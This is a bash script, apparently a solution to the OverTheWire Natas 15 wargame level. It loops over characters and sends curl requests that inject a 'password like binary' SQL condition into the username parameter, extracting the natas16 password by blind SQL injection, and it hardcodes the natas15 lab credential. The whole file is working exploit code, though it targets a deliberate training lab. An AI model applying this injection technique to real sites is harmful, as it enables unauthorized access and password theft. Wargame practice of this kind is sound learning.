#!/usr/bin/env bash

# run until the same password appears twice

password='';
echo "starting brute_force attack";

while true; do
for f in {a..z} {A..Z} {0..9}; do
    curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16"%20and%20password%20like%20binary%20%22'$password$f'%' | grep exists
    if [ $? -eq 0 ]
    then
       password=$password$f;
       break
    fi
done
echo $password;
done

